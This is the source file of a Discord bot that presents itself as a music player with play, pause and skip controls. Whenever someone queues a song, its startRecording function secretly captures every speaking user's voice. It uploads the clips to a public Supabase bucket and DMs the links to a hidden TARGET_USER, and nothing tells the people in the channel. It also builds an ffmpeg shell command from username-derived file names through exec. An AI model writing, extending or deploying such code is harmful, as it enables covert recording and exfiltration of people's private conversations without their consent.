require('dotenv').config();
const fs = require('fs');
const { exec } = require('child_process');
const prism = require('prism-media');

const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { joinVoiceChannel, createAudioPlayer, createAudioResource, AudioPlayerStatus } = require('@discordjs/voice');
const play = require('play-dl');

const { createClient } = require('@supabase/supabase-js');
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates
    ]
});

let queue = [];
let player = createAudioPlayer();
let connection = null;
let lastChannel = null;
let timeout = null;

// 🎵 Música
async function playMusic(channel) {
    if (queue.length === 0) return;

    const song = queue[0];
    const stream = await play.stream(song.url);
    const resource = createAudioResource(stream.stream, { inputType: stream.type });

    player.play(resource);
    connection.subscribe(player);

    const embed = new EmbedBuilder()
        .setTitle('🎵 Reproduciendo')
        .setDescription(song.title);

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('pause').setLabel('⏸️').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('resume').setLabel('▶️').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('skip').setLabel('⏭️').setStyle(ButtonStyle.Danger)
    );

    channel.send({ embeds: [embed], components: [row] });
}

player.on(AudioPlayerStatus.Idle, () => {
    queue.shift();
    playMusic(lastChannel);
});

// 🎤 Grabación
function convertToOgg(input, output) {
    return new Promise((resolve, reject) => {
        exec(`ffmpeg -f s16le -ar 48000 -ac 2 -i ${input} ${output}`, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
}

async function uploadToSupabase(filePath, fileName) {
    const fileBuffer = fs.readFileSync(filePath);

    await supabase.storage
        .from('recordings')
        .upload(fileName, fileBuffer, { contentType: 'audio/ogg', upsert: true });

    const { data } = supabase.storage.from('recordings').getPublicUrl(fileName);
    return data.publicUrl;
}

function startRecording(connection) {
    const receiver = connection.receiver;

    receiver.speaking.on('start', (userId) => {
        const user = client.users.cache.get(userId);
        if (!user) return;

        const opusStream = receiver.subscribe(userId, {
            end: { behavior: 'silence', duration: 1000 }
        });

        const fileName = `${user.username}-${Date.now()}`;
        const pcmPath = `./${fileName}.pcm`;
        const oggPath = `./${fileName}.ogg`;

        const pcmStream = new prism.opus.Decoder({
            frameSize: 960,
            channels: 2,
            rate: 48000
        });

        const out = fs.createWriteStream(pcmPath);

        opusStream.pipe(pcmStream).pipe(out);

        out.on('finish', async () => {
            await convertToOgg(pcmPath, oggPath);
            const url = await uploadToSupabase(oggPath, `${fileName}.ogg`);

            const targetUser = await client.users.fetch(process.env.TARGET_USER);
            await targetUser.send(`🎤 ${user.username}: ${url}`);

            fs.unlinkSync(pcmPath);
            fs.unlinkSync(oggPath);
        });
    });
}

// 💬 Comandos
client.on('messageCreate', async (message) => {
    if (!message.content.startsWith('-') || message.author.bot) return;

    const args = message.content.slice(1).split(' ');
    const cmd = args.shift().toLowerCase();

    if (cmd === 'play') {
        const query = args.join(' ');
        const vc = message.member.voice.channel;
        if (!vc) return message.reply('Únete a un canal de voz');

        lastChannel = message.channel;

        connection = joinVoiceChannel({
            channelId: vc.id,
            guildId: vc.guild.id,
            adapterCreator: vc.guild.voiceAdapterCreator
        });

        startRecording(connection);

        const result = await play.search(query, { limit: 1 });
        queue.push({ title: result[0].title, url: result[0].url });

        message.reply('Añadido a la cola');

        if (queue.length === 1) playMusic(message.channel);
    }

    if (cmd === 'pause') player.pause();
    if (cmd === 'resume') player.unpause();
    if (cmd === 'skip') player.stop();
});

// 🔘 Botones
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'pause') player.pause();
    if (interaction.customId === 'resume') player.unpause();
    if (interaction.customId === 'skip') player.stop();

    interaction.reply({ content: 'OK', ephemeral: true });
});

// 🔌 Auto desconectar
setInterval(() => {
    if (!connection) return;

    const channel = client.channels.cache.get(connection.joinConfig.channelId);
    if (!channel) return;

    const humans = channel.members.filter(m => !m.user.bot);

    if (humans.size === 0) {
        if (!timeout) {
            timeout = setTimeout(() => {
                connection.destroy();
                connection = null;
                queue = [];
            }, 10000);
        }
    } else {
        clearTimeout(timeout);
        timeout = null;
    }
}, 5000);

// 🚀 Login
client.login(process.env.TOKEN);